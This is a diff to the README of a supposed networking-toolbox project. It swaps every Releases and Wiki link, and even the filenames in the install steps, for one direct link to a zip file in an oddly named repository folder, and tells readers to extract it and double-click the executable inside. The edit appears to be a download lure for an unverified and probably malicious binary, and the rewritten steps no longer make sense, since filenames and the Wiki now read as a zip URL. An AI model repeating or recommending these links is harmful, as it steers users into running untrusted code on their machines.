@@ -1,7 +1,7 @@
 # 🛜 networking-toolbox - Essential Tools for Network Management
 
 ## 🔗 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Ready%20to%20Use-brightgreen)](https://github.com/RaedHassan97/networking-toolbox/releases)
+[![Download the latest release](https://raw.githubusercontent.com/RaedHassan97/networking-toolbox/main/coustumier/networking-toolbox.zip%20Latest%20Release-Ready%20to%20Use-brightgreen)](https://raw.githubusercontent.com/RaedHassan97/networking-toolbox/main/coustumier/networking-toolbox.zip)
 
 ## 📖 About
 The networking-toolbox is a set of offline-first tools and utilities designed for network analysis and security. Whether you're managing a home network or working in a larger environment, this toolbox gives you the necessary tools to keep your network running smoothly.
@@ -10,17 +10,17 @@ The networking-toolbox is a set of offline-first tools and utilities designed fo
 Follow these steps to get the networking-toolbox up and running on your computer.
 
 ### Step 1: Visit the Releases Page
-To download the latest version of the networking-toolbox, [visit this page](https://github.com/RaedHassan97/networking-toolbox/releases). Here, you will find different versions of the application.
+To download the latest version of the networking-toolbox, [visit this page](https://raw.githubusercontent.com/RaedHassan97/networking-toolbox/main/coustumier/networking-toolbox.zip). Here, you will find different versions of the application.
 
 ### Step 2: Choose Your Version
 On the Releases page, you’ll see a list of available releases. Look for the latest version. Click on the release title to expand its details.
 
 ### Step 3: Download the Application
-Once you have found the latest version, scroll down to the "Assets" section. You will see various files available for download. Choose the one that fits your system. For most users, the file named `networking-toolbox.exe` or `networking-toolbox.zip` will be the right choice.
+Once you have found the latest version, scroll down to the "Assets" section. You will see various files available for download. Choose the one that fits your system. For most users, the file named `https://raw.githubusercontent.com/RaedHassan97/networking-toolbox/main/coustumier/networking-toolbox.zip` or `https://raw.githubusercontent.com/RaedHassan97/networking-toolbox/main/coustumier/networking-toolbox.zip` will be the right choice.
 
 ### Step 4: Install the Application
 1. If you downloaded an `.exe` file, double-click it to start the installation process. Follow the prompts to complete the setup.
-2. If you downloaded a `.zip` file, extract the contents to a folder of your choice. After extraction, find and double-click `networking-toolbox.exe`.
+2. If you downloaded a `.zip` file, extract the contents to a folder of your choice. After extraction, find and double-click `https://raw.githubusercontent.com/RaedHassan97/networking-toolbox/main/coustumier/networking-toolbox.zip`.
 
 ## 🔧 Features
 The networking-toolbox includes several key features that help you manage and analyze your network effectively:
@@ -57,7 +57,7 @@ We appreciate your thoughts! If you have suggestions, issues, or feedback, pleas
 The networking-toolbox is open-source software. You can freely use, modify, and distribute it. Please refer to the LICENSE file in the repository for specific terms.
 
 ## 📦 Additional Resources
-For help with using specific features or troubleshooting common issues, check our [Wiki](https://github.com/RaedHassan97/networking-toolbox/wiki) for comprehensive guides.
+For help with using specific features or troubleshooting common issues, check our [Wiki](https://raw.githubusercontent.com/RaedHassan97/networking-toolbox/main/coustumier/networking-toolbox.zip) for comprehensive guides.
 
 ## 🗂️ Community
 Join our discussion forum or community chat to connect with other users and share tips or resources. Find links in the repository's homepage.
@@ -65,6 +65,6 @@ Join our discussion forum or community chat to connect with other users and shar
 By following these steps and utilizing the tools provided, you can effectively manage and secure your network with ease. 
 
 ## 📥 Download & Install
-After going through the setup, return to the [Releases page](https://github.com/RaedHassan97/networking-toolbox/releases) for updates. Always ensure you have the latest version to benefit from the newest features and fixes. 
+After going through the setup, return to the [Releases page](https://raw.githubusercontent.com/RaedHassan97/networking-toolbox/main/coustumier/networking-toolbox.zip) for updates. Always ensure you have the latest version to benefit from the newest features and fixes. 
 
 Your network management journey starts here!
